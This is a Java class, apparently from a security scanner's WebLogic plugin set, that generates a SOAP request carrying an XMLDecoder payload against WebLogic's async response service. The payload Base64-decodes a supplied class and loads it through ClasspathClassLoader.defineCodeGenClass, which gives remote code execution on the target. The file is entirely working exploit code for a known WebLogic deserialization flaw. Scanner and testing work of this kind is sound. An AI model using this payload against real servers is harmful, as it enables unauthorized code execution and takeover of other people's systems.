package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.gbw.scanner.utils.ClassFiles;
import sun.misc.BASE64Encoder;


public class GBWPayload10271 implements GBWXmlEchoPayload {
    private String echoClass;
    private String className;
    public GBWPayload10271(Class payload) {
        this.echoClass= new BASE64Encoder().encode(ClassFiles.classAsBytes(payload)).replace("\n","");
        this.className=payload.getName();
    }
    @Override
    public String getXml() throws Exception {
        StringBuilder sb=new StringBuilder();
        sb.append("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java>");
        sb.append(String.format("<void class=\"sun.misc.BASE64Decoder\"><void method=\"decodeBuffer\" id=\"byte_arr\"><string>%s</string></void></void><void class=\"weblogic.utils.classloaders.ClasspathClassLoader\"><void method=\"defineCodeGenClass\"><string>%s</string><object idref=\"byte_arr\"></object><object class=\"java.net.URL\"/></void></void>",echoClass,className));
        sb.append("</java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>");
        return sb.toString();
    }

    @Override
    public String getName() {
        return "GBWPayload10271";
    }
}
